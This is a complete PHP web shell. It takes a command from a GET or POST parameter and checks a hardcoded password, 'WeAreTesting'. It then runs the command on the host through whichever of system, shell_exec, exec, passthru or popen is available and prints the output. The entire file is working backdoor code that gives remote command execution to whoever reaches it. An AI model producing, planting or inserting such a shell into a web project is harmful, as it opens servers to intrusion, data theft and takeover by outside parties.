<?php

error_reporting( E_ALL );

$cmd = "";
$password = "";

if ($_GET['cmd'] & $_GET['password'])
{
	$cmd = urldecode($_GET['cmd']);
	$password = urldecode($_GET['password']);
}
elseif ($_POST['cmd'] & $_POST['password'])
{
	$cmd = $_POST['cmd'];
	$password = $_POST['password'];
}

if ($password != "WeAreTesting") { echo "wrong password\n"; exit; }

run_command($cmd);

function run_command($cmd)
{
	if (function_exists('system'))
	{
		system($cmd." 2>&1");
		exit;
	}

	if (function_exists('shell_exec'))
	{
		echo shell_exec($cmd." 2>&1");
		exit;
	}

	if (function_exists('exec'))
	{
		exec($cmd." 2>&1", $output);
		echo implode("\n", $output);
		echo "\n";
		exit;
	}

	if (function_exists('passthru'))
	{
		passthru($cmd." 2>&1");
		exit;
	}

	if (function_exists('popen'))
	{
		$handle = popen($cmd. " 2>&1", 'r');
		while (!feof($handle)) {
		    echo fgets($handle);
		}

		$read = fread($handle, 10);
		echo $read;
		pclose($handle);
		exit;
	}

	echo "We can't find a valid execution method. Tried: system, exec, shell_exec, passthru, popen.";
}

?>
